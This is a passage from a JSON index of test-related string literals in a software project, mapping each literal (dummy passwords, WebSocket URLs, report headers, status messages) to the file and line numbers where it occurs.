        "auth_service/tests/test_critical_oauth_environment_failures.py:327"
      ]
    },
    "weak_password": {
      "value": "weak_password",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:371"
      ]
    },
    "web": {
      "value": "web",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:157",
        "scripts/test_coordination_fixes.py:318"
      ]
    },
    "web_": {
      "value": "web_",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/session_factory.py:93"
      ]
    },
    "webpack": {
      "value": "webpack",
      "category": "test_literals",
      "locations": [
        "scripts/cleanup_test_processes.py:70"
      ]
    },
    "websocket": {
      "value": "websocket",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:19",
        "scripts/analyze_test_mocks.py:48",
        "scripts/analyze_test_mocks.py:49",
        "scripts/auto_fix_test_sizes.py:342",
        "scripts/auto_fix_test_sizes.py:343",
        "scripts/auto_fix_test_violations.py:495",
        "scripts/auto_fix_test_violations.py:496",
        "scripts/business_value_test_index.py:96",
        "scripts/business_value_test_index.py:381",
        "scripts/business_value_test_index.py:421"
      ]
    },
    "websocket_config": {
      "value": "websocket_config",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:94",
        "scripts/test_websocket_dev_mode.py:96"
      ]
    },
    "websocket_connection": {
      "value": "websocket_connection",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:41",
        "scripts/test_websocket_dev_mode.py:190",
        "scripts/test_websocket_dev_mode.py:220",
        "scripts/test_websocket_dev_mode.py:229"
      ]
    },
    "websocket_manager": {
      "value": "websocket_manager",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:45"
      ]
    },
    "websocket_manager = Mock()": {
      "value": "websocket_manager = Mock()",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_fixer.py:56"
      ]
    },
    "websocket_manager = UnifiedWebSocketManager()": {
      "value": "websocket_manager = UnifiedWebSocketManager()",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_fixer.py:58"
      ]
    },
    "websocket_timeout": {
      "value": "websocket_timeout",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:46",
        "scripts/test_cold_start_e2e.py:294",
        "scripts/test_cold_start_e2e.py:398"
      ]
    },
    "websocket_url": {
      "value": "websocket_url",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:106"
      ]
    },
    "websockets library not installed - skipping WebSocket connection test": {
      "value": "websockets library not installed - skipping WebSocket connection test",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:227"
      ]
    },
    "websocket|WebSocket|ws://": {
      "value": "websocket|WebSocket|ws://",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:442"
      ]
    },
    "websocket|ws|realtime|socket": {
      "value": "websocket|ws|realtime|socket",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:96"
      ]
    },
    "weekend_multiplier": {
      "value": "weekend_multiplier",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:31",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:37",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:43",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:93"
      ]
    },
    "when expecting": {
      "value": "when expecting",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_oauth_id_token_validation.py:177"
      ]
    },
    "widget": {
      "value": "widget",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:172",
        "scripts/compliance/project_test_validator.py:184",
        "scripts/compliance/real_test_requirements_enforcer.py:239",
        "scripts/compliance/real_test_requirements_enforcer.py:261",
        "scripts/compliance/real_test_validator.py:136"
      ]
    },
    "win32": {
      "value": "win32",
      "category": "test_literals",
      "locations": [
        "scripts/fix_common_test_issues.py:58",
        "scripts/test_backend.py:56",
        "scripts/test_backend_optimized.py:456",
        "scripts/test_frontend.py:522",
        "scripts/test_oauth_local.py:21",
        "scripts/test_oauth_local.py:35",
        "scripts/test_workflows_with_act.py:17"
      ]
    },
    "with": {
      "value": "with",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:283"
      ]
    },
    "worker": {
      "value": "worker",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:52",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:35"
      ]
    },
    "workers": {
      "value": "workers",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:194",
        "scripts/unified_test_config.py:201",
        "scripts/unified_test_config.py:208",
        "scripts/unified_test_config.py:215",
        "scripts/unified_test_config.py:350"
      ]
    },
    "workflow": {
      "value": "workflow",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:294",
        "scripts/test_workflows_with_act.py:305",
        "scripts/test_workflows_with_act.py:340",
        "scripts/test_workflows_with_act.py:346"
      ]
    },
    "workflow-test-report.json": {
      "value": "workflow-test-report.json",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:350"
      ]
    },
    "workflow_call": {
      "value": "workflow_call",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:148"
      ]
    },
    "workflow_verification_results.md": {
      "value": "workflow_verification_results.md",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status_corrected.py:259"
      ]
    },
    "workflow_verification_test_report.md": {
      "value": "workflow_verification_test_report.md",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:215"
      ]
    },
    "workflows": {
      "value": "workflows",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:27"
      ]
    },
    "workflows to test": {
      "value": "workflows to test",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:280"
      ]
    },
    "workload": {
      "value": "workload",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:54"
      ]
    },
    "workload_patterns": {
      "value": "workload_patterns",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/models.py:16"
      ]
    },
    "workload_type": {
      "value": "workload_type",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:72",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:257"
      ]
    },
    "workloads": {
      "value": "workloads",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:495"
      ]
    },
    "write": {
      "value": "write",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_generation.py:45",
        "auth_service/tests/test_auth_token_security.py:42",
        "auth_service/tests/unified/test_jwt_validation.py:45",
        "auth_service/tests/unified/test_jwt_validation.py:130",
        "auth_service/tests/unified/test_jwt_validation.py:331",
        "auth_service/tests/unit/test_oauth_models.py:116",
        "auth_service/tests/unit/test_oauth_models.py:124"
      ]
    },
    "wrong": {
      "value": "wrong",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_security.py:394"
      ]
    },
    "wrong connection name": {
      "value": "wrong connection name",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:262"
      ]
    },
    "wrong-issuer": {
      "value": "wrong-issuer",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_validation.py:171"
      ]
    },
    "wrong-secret-key": {
      "value": "wrong-secret-key",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/token_factory.py:159",
        "auth_service/tests/test_auth_token_security.py:232"
      ]
    },
    "wrong_password": {
      "value": "wrong_password",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_authentication_failures.py:51",
        "auth_service/tests/test_staging_database_credentials.py:77"
      ]
    },
    "wrong_secret": {
      "value": "wrong_secret",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:463"
      ]
    },
    "wrong_session_12345": {
      "value": "wrong_session_12345",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:328"
      ]
    },
    "wrong_session_999": {
      "value": "wrong_session_999",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:156"
      ]
    },
    "wrong_verifier": {
      "value": "wrong_verifier",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:176"
      ]
    },
    "wrongpass": {
      "value": "wrongpass",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:483",
        "auth_service/tests/test_security.py:496",
        "auth_service/tests/test_security.py:650"
      ]
    },
    "ws": {
      "value": "ws",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:48",
        "scripts/auto_fix_test_sizes.py:342",
        "scripts/auto_fix_test_violations.py:495"
      ]
    },
    "ws://": {
      "value": "ws://",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:457"
      ]
    },
    "ws://localhost:": {
      "value": "ws://localhost:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_env.py:25"
      ]
    },
    "ws://localhost:8000": {
      "value": "ws://localhost:8000",
      "category": "test_literals",
      "locations": [
        "scripts/start_test_services.py:155",
        "scripts/unified_test_runner.py:185"
      ]
    },
    "ws://localhost:8000/ws": {
      "value": "ws://localhost:8000/ws",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:35",
        "scripts/test_websocket_simple.py:13"
      ]
    },
    "ws_url": {
      "value": "ws_url",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:446"
      ]
    },
    "wss://api.staging.netrasystems.ai/ws": {
      "value": "wss://api.staging.netrasystems.ai/ws",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging.py:31",
        "scripts/test_staging_deployment.py:147"
      ]
    },
    "wss://ws.staging.netra.ai": {
      "value": "wss://ws.staging.netra.ai",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:106"
      ]
    },
    "x": {
      "value": "x",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:412",
        "auth_service/tests/integration/test_auth_oauth_errors.py:413",
        "auth_service/tests/integration/test_auth_oauth_errors.py:421",
        "auth_service/tests/test_security.py:403",
        "auth_service/tests/test_security.py:441",
        "auth_service/tests/test_security.py:462",
        "auth_service/tests/unit/test_oauth_state_security.py:88",
        "scripts/test_backend_optimized.py:330"
      ]
    },
    "x (valid:": {
      "value": "x (valid:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_security.py:430"
      ]
    },
    "xdist": {
      "value": "xdist",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:153"
      ]
    },
    "xss_payloads": {
      "value": "xss_payloads",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:90",
        "auth_service/tests/test_security.py:254",
        "auth_service/tests/test_security.py:284",
        "auth_service/tests/test_security.py:313",
        "auth_service/tests/test_security.py:690"
      ]
    },
    "y": {
      "value": "y",
      "category": "test_literals",
      "locations": [
        "scripts/cleanup_test_processes.py:112",
        "scripts/iterative_test_fix_loop.py:151"
      ]
    },
    "year_end": {
      "value": "year_end",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:35"
      ]
    },
    "your-client-id.googleusercontent.com": {
      "value": "your-client-id.googleusercontent.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_oauth_id_token_validation.py:42"
      ]
    },
    "zinc": {
      "value": "zinc",
      "category": "test_literals",
      "locations": [
        "frontend/components/chat/ConnectionStatusIndicator.test.tsx:28"
      ]
    },
    "{": {
      "value": "{",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:318",
        "scripts/check_test_compliance.py:49",
        "scripts/check_test_compliance.py:53",
        "scripts/compliance/real_test_requirements_enforcer.py:438",
        "scripts/comprehensive_test_fixer.py:202"
      ]
    },
    "|": {
      "value": "|",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:366",
        "auth_service/tests/test_critical_service_id_configuration_failures.py:173",
        "scripts/compliance/test_size_validator.py:479",
        "scripts/compliance/test_size_validator.py:479",
        "scripts/compliance/test_size_validator.py:479",
        "scripts/compliance/test_size_validator.py:479",
        "scripts/compliance/test_size_validator.py:479",
        "scripts/compliance/test_size_validator.py:488",
        "scripts/compliance/test_size_validator.py:488",
        "scripts/compliance/test_size_validator.py:488"
      ]
    },
    "| $": {
      "value": "| $",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:150"
      ]
    },
    "| Database | Queries | Avg Latency (ms) |": {
      "value": "| Database | Queries | Avg Latency (ms) |",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:158"
      ]
    },
    "| File | Function | Lines | Limit | Fix Suggestion |": {
      "value": "| File | Function | Lines | Limit | Fix Suggestion |",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:485"
      ]
    },
    "| File | Lines | Limit | Fix Suggestion |": {
      "value": "| File | Lines | Limit | Fix Suggestion |",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:476"
      ]
    },
    "| Model | Calls | Estimated Cost |": {
      "value": "| Model | Calls | Estimated Cost |",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:146"
      ]
    },
    "|----------|---------|------------------|": {
      "value": "|----------|---------|------------------|",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:158"
      ]
    },
    "|-------|-------|----------------|": {
      "value": "|-------|-------|----------------|",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:146"
      ]
    },
    "|------|----------|-------|-------|----------------|": {
      "value": "|------|----------|-------|-------|----------------|",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:486"
      ]
    },
    "|------|-------|-------|----------------|": {
      "value": "|------|-------|-------|----------------|",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:477"
      ]
    },
    "|def": {
      "value": "|def",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:101"
      ]
    },
    "}": {
      "value": "}",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:318",
        "scripts/check_test_compliance.py:49",
        "scripts/check_test_compliance.py:53",
        "scripts/compliance/real_test_requirements_enforcer.py:438"
      ]
    },
    "Пароль123!测试": {
      "value": "Пароль123!测试",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_password_hashing_basics.py:128"
      ]
    },
    "•": {
      "value": "•",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:349"
      ]
    },
    "• For excessive_mocking violations: Use real components where possible": {
      "value": "• For excessive_mocking violations: Use real components where possible",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:149"
      ]
    },
    "• For file_size violations: Split large test files into focused modules": {
      "value": "• For file_size violations: Split large test files into focused modules",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:147"
      ]
    },
    "• For function_size violations: Extract helper methods": {
      "value": "• For function_size violations: Extract helper methods",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:148"
      ]
    },
    "• For mock_component violations: Replace with real component instantiation": {
      "value": "• For mock_component violations: Replace with real component instantiation",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:150"
      ]
    },
    "• Run with --fix to attempt automatic fixes": {
      "value": "• Run with --fix to attempt automatic fixes",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:146"
      ]
    },
    "ℹ️": {
      "value": "ℹ️",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:525"
      ]
    },
    "→": {
      "value": "→",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:90",
        "scripts/test_staging_env.py:182"
      ]
    },
    "↔ `": {
      "value": "↔ `",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:592",
        "scripts/analyze_test_overlap.py:607"
      ]
    },
    "⏭️": {
      "value": "⏭️",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:656"
      ]
    },
    "⏭️ SKIPPED": {
      "value": "⏭️ SKIPPED",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:700"
      ]
    },
    "⏰": {
      "value": "⏰",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:121"
      ]
    },
    "⏰ Test timed out": {
      "value": "⏰ Test timed out",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:318"
      ]
    },
    "⏱️ STABILITY | Keeping services running for 5 seconds...": {
      "value": "⏱️ STABILITY | Keeping services running for 5 seconds...",
      "category": "test_literals",
      "locations": [
        "scripts/test_service_startup.py:102"
      ]
    },
    "⏳ Waiting for services to be healthy...": {
      "value": "⏳ Waiting for services to be healthy...",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:145"
      ]
    },
    "⚠": {
      "value": "⚠",
      "category": "test_literals",
      "locations": [
        "scripts/fix_all_test_issues.py:295"
      ]
    },
    "⚠ Manual fix needed: Extract helpers in": {
      "value": "⚠ Manual fix needed: Extract helpers in",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:175"
      ]
    },
    "⚠ Manual fix needed: Split": {
      "value": "⚠ Manual fix needed: Split",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:172"
      ]
    },
    "⚠ Needs manual review:": {
      "value": "⚠ Needs manual review:",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:313"
      ]
    },
    "⚠️": {
      "value": "⚠️",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:529",
        "scripts/compliance/real_test_requirements_enforcer.py:525",
        "scripts/test_cold_start_e2e.py:209",
        "scripts/test_cold_start_e2e.py:213"
      ]
    },
    "⚠️  .secrets file not found. Creating with mock values...": {
      "value": "⚠️  .secrets file not found. Creating with mock values...",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:73"
      ]
    },
    "⚠️  Exiting with warning due to": {
      "value": "⚠️  Exiting with warning due to",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:463"
      ]
    },
    "⚠️  Found": {
      "value": "⚠️  Found",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:444"
      ]
    },
    "⚠️  Issues Found (": {
      "value": "⚠️  Issues Found (",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:338"
      ]
    },
    "⚠️  Issues found in": {
      "value": "⚠️  Issues found in",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:290"
      ]
    },
    "⚠️  MEDIUM SEVERITY (": {
      "value": "⚠️  MEDIUM SEVERITY (",
      "category": "test_literals",
      "locations": [
        "scripts/ci/check_test_stubs.py:77"
      ]
    },
    "⚠️  NO TESTS WERE RUN": {
      "value": "⚠️  NO TESTS WERE RUN",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:358"
      ]
    },
    "⚠️  Test timeout": {
      "value": "⚠️  Test timeout",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:179"
      ]
    },
    "⚠️  Validation timeout": {
      "value": "⚠️  Validation timeout",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:136"
      ]
    },
    "⚠️ HIGH: Address": {
      "value": "⚠️ HIGH: Address",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:202"
      ]
    },
    "⚠️ MEDIUM": {
      "value": "⚠️ MEDIUM",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:551"
      ]
    },
    "⚠️ No model response received within timeout": {
      "value": "⚠️ No model response received within timeout",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:426"
      ]
    },
    "⚠️ SOME TESTS FAILED": {
      "value": "⚠️ SOME TESTS FAILED",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:495"
      ]
    },
    "⚠️ Some tests failed. Please check the failures above.": {
      "value": "⚠️ Some tests failed. Please check the failures above.",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_env.py:195"
      ]
    },
    "⚠️ WARNING | Auth service failed to start": {
      "value": "⚠️ WARNING | Auth service failed to start",
      "category": "test_literals",
      "locations": [
        "scripts/test_service_startup.py:76"
      ]
    },
    "⚠️ WARNING | Auth system verification failed": {
      "value": "⚠️ WARNING | Auth system verification failed",
      "category": "test_literals",
      "locations": [
        "scripts/test_service_startup.py:97"
      ]
    },
    "⚠️ WARNING | Backend readiness check failed": {
      "value": "⚠️ WARNING | Backend readiness check failed",
      "category": "test_literals",
      "locations": [
        "scripts/test_service_startup.py:89"
      ]
    },
    "⚠️ WARNING | Cleanup error:": {
      "value": "⚠️ WARNING | Cleanup error:",
      "category": "test_literals",
      "locations": [
        "scripts/test_service_startup.py:121"
      ]
    },
    "⚠️ WARNING | Migration issues, continuing...": {
      "value": "⚠️ WARNING | Migration issues, continuing...",
      "category": "test_literals",
      "locations": [
        "scripts/test_service_startup.py:62"
      ]
    },
    "⚠️ WARNING | Secrets loading had issues, continuing...": {
      "value": "⚠️ WARNING | Secrets loading had issues, continuing...",
      "category": "test_literals",
      "locations": [
        "scripts/test_service_startup.py:49"
      ]
    },
    "⚠️ Warning:": {
      "value": "⚠️ Warning:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:608"
      ]
    },
    "⚡ HIGH PRIORITY: Address": {
      "value": "⚡ HIGH PRIORITY: Address",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:334"
      ]
    },
    "✅": {
      "value": "✅",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:883",
        "scripts/test_cold_start_e2e.py:206",
        "scripts/test_coordination_fixes.py:63",
        "scripts/test_example_message_flow.py:112",
        "scripts/test_example_message_flow.py:321",
        "scripts/test_staging_env.py:189",
        "scripts/unified_test_runner.py:656"
      ]
    },
    "✅  No fake tests detected - good job!": {
      "value": "✅  No fake tests detected - good job!",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:450"
      ]
    },
    "✅ ACT found:": {
      "value": "✅ ACT found:",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:45"
      ]
    },
    "✅ All E2E tests passed successfully!": {
      "value": "✅ All E2E tests passed successfully!",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:100"
      ]
    },
    "✅ All auth service startup tests passed": {
      "value": "✅ All auth service startup tests passed",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:204"
      ]
    },
    "✅ All imports successful": {
      "value": "✅ All imports successful",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:220"
      ]
    },
    "✅ All services are healthy": {
      "value": "✅ All services are healthy",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:163"
      ]
    },
    "✅ All test files comply with real test requirements!": {
      "value": "✅ All test files comply with real test requirements!",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:105"
      ]
    },
    "✅ All tests appear to be legitimate - no fake tests detected!": {
      "value": "✅ All tests appear to be legitimate - no fake tests detected!",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:466"
      ]
    },
    "✅ All tests completed successfully!": {
      "value": "✅ All tests completed successfully!",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:289"
      ]
    },
    "✅ All tests comply with real test requirements!": {
      "value": "✅ All tests comply with real test requirements!",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:611"
      ]
    },
    "✅ All tests passed!": {
      "value": "✅ All tests passed!",
      "category": "test_literals",
      "locations": [
        "scripts/iterative_test_fix_loop.py:114"
      ]
    },
    "✅ Auth service import resolution test passed": {
      "value": "✅ Auth service import resolution test passed",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:234"
      ]
    },
    "✅ Auth startup command structure test passed": {
      "value": "✅ Auth startup command structure test passed",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:270"
      ]
    },
    "✅ Authentication successful (user:": {
      "value": "✅ Authentication successful (user:",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:247"
      ]
    },
    "✅ Code injection attempts: HANDLED SAFELY": {
      "value": "✅ Code injection attempts: HANDLED SAFELY",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:465"
      ]
    },
    "✅ Concurrent access attacks: BLOCKED": {
      "value": "✅ Concurrent access attacks: BLOCKED",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:464"
      ]
    },
    "✅ Configuration validation passed": {
      "value": "✅ Configuration validation passed",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:239"
      ]
    },
    "✅ Created .secrets file with mock values": {
      "value": "✅ Created .secrets file with mock values",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:92"
      ]
    },
    "✅ Docker found:": {
      "value": "✅ Docker found:",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:62"
      ]
    },
    "✅ Dry run successful": {
      "value": "✅ Dry run successful",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:171"
      ]
    },
    "✅ Expiration handling: 10 MINUTES CONFIGURED": {
      "value": "✅ Expiration handling: 10 MINUTES CONFIGURED",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:468"
      ]
    },
    "✅ Fixed and validated successfully": {
      "value": "✅ Fixed and validated successfully",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:317"
      ]
    },
    "✅ Fixed circular env.ACT reference": {
      "value": "✅ Fixed circular env.ACT reference",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:259"
      ]
    },
    "✅ Graceful degradation with optional services": {
      "value": "✅ Graceful degradation with optional services",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:420"
      ]
    },
    "✅ Handler initialization successful": {
      "value": "✅ Handler initialization successful",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:264"
      ]
    },
    "✅ Imports successful": {
      "value": "✅ Imports successful",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:388"
      ]
    },
    "✅ Initialization successful": {
      "value": "✅ Initialization successful",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:394"
      ]
    },
    "✅ Memory store fallback: WORKING": {
      "value": "✅ Memory store fallback: WORKING",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:466"
      ]
    },
    "✅ Message sent successfully": {
      "value": "✅ Message sent successfully",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:359"
      ]
    },
    "✅ Message validation successful": {
      "value": "✅ Message validation successful",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:300",
        "scripts/test_example_message_flow.py:417"
      ]
    },
    "✅ Model response contains expected pattern:": {
      "value": "✅ Model response contains expected pattern:",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:420"
      ]
    },
    "✅ Multiple replay attempts: BLOCKED": {
      "value": "✅ Multiple replay attempts: BLOCKED",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:463"
      ]
    },
    "✅ No fake tests detected! Codebase follows testing best practices.": {
      "value": "✅ No fake tests detected! Codebase follows testing best practices.",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:186"
      ]
    },
    "✅ PASS": {
      "value": "✅ PASS",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:486"
      ]
    },
    "✅ PASSED": {
      "value": "✅ PASSED",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_integration.py:148",
        "scripts/test_staging_env.py:170",
        "scripts/unified_test_runner.py:698",
        "scripts/unified_test_runner.py:703"
      ]
    },
    "✅ Passed:": {
      "value": "✅ Passed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:334"
      ]
    },
    "✅ Port allocation conflict prevention": {
      "value": "✅ Port allocation conflict prevention",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:418"
      ]
    },
    "✅ Race condition prevention: ATOMIC OPERATIONS": {
      "value": "✅ Race condition prevention: ATOMIC OPERATIONS",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:469"
      ]
    },
    "✅ Readiness vs health check separation": {
      "value": "✅ Readiness vs health check separation",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:417"
      ]
    },
    "✅ Received model event:": {
      "value": "✅ Received model event:",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:412"
      ]
    },
    "✅ Redis integration: WORKING WITH FAILOVER": {
      "value": "✅ Redis integration: WORKING WITH FAILOVER",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:467"
      ]
    },
    "✅ STAGING TESTS PASSED": {
      "value": "✅ STAGING TESTS PASSED",
